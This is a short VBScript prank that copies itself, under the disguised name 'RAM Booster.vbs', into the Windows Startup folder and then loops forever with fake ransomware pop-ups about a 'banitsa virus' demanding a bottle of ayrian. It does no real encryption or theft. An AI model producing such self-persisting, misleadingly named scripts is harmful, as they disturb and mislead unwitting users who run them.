'https://computer-pranks.wonderhowto.com/how-to/make-prank-popup-message-windows-thats-hard-get-rid-0124836/
'https://social.technet.microsoft.com/Forums/ie/en-US/6240a1cc-ee80-46e7-9db4-87a4a42a7b60/copying-file-from-relative-path-to-startup-folder?forum=ITCG

dim file, relpath, objshell, startupfolder

set file = createobject("scripting.filesystemobject")
set objshell = createobject("wscript.shell")

relpath = file.getparentfoldername(wscript.scriptfullname)
startupfolder = objshell.specialfolders("Startup")

if file.fileexists(relpath & "\RAM Booster.vbs") then
	file.copyfile relpath & "\RAM Booster.vbs", startupfolder & "\"
end if

do
	msgbox("Your computer has been infected with a banitsa virus.")
	msgbox("Please purchase a bottle of ayrian in order to unlock your files.")
loop